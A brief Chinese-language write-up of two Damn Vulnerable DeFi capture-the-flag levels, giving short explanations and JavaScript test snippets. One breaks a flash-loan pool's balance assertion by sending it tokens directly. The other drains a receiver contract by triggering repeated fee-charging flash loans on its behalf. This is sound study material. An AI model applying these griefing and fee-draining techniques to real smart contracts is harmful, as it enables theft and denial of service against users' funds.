### 1.unstoppable
根据题目，即为攻击合约让他停止工作，在flashLoan函数里面有一句assert(poolBalance == balancebefore),所以让两者不相等即可 

方法即为：transfer 1 ether给合约 

攻击代码： 

 it('Exploit', async function () { 
 
     /** COOD YOUR EXPLOIT HIRE */ 
     
     await this.token.transfer(this.pool.address,1); 
     
 }); 
 
 ### 2.Naive receiver 
 
 题目要求：抽空用户合约里的所有eth 
 
 flashLoan函数以borrower借款 
 
 攻击代码： 
 
  it('Exploit', async function () { 
  
     /** COOD YOUR EXPLOIT HIRE */ 
     
     for(i=0;i<10;i++){ 
     
     await this.pool.flashLoan(this.receiver.address,0); 
     
     } 
     
  });  
